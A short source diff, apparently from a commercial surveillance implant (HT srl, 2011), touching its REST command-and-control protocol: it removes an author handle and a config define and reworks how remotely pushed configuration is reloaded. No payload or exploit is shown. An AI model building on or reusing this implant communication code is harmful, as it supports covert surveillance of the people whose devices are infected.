@@ -3,7 +3,7 @@
  *  Implementation for REST Protocol.
  *
  *
- * Created by revenge on 12/01/2011
+ * Created on 12/01/2011
  * Copyright (C) HT srl 2011. All rights reserved
  *
  */
@@ -30,8 +30,6 @@
 
 //#import "RCSMLogger.h"
 //#import "RCSMDebug.h"
-
-#define JSON_CONFIG
 
 //#define DEBUG_PROTO
 #define infoLog NSLog
@@ -82,7 +80,7 @@ typedef struct _ApnStruct {
       NSString *host;
       mUsedAPN    = NO;
       mWifiForced = NO;
-
+    
       if (aType == ACTION_SYNC)
         {
           syncStruct *header  = (syncStruct *)[aConfiguration bytes];
@@ -369,7 +367,7 @@ typedef struct _ApnStruct {
         case PROTO_NEW_CONF:
           {
             ConfNetworkOperation *confOP = [[ConfNetworkOperation alloc]
-                                            initWithTransport: transport];
+                                              initWithTransport: transport];
             if ([confOP perform] == NO)
               {
                 [confOP sendConfAck:PROTO_NO];
@@ -554,16 +552,11 @@ typedef struct _ApnStruct {
     }
 #endif
   
-  //
-  // Time to reload the configuration if needed
-  // TODO: Refactor this
-  //
-  RCSITaskManager *_taskManager = [RCSITaskManager sharedInstance];
   
-  if (_taskManager.mShouldReloadConfiguration == YES)
+  if ([[RCSIConfManager sharedInstance] mShouldReloadConfiguration] == YES)
     {
-      if ([_taskManager reloadConfiguration] == FALSE)
-        [_taskManager checkManagersAndRestart];
+      [[RCSIConfManager sharedInstance] sendReloadNotification];
+      [[RCSIConfManager sharedInstance] setMShouldReloadConfiguration: NO];
     }
   
   [commandList release];
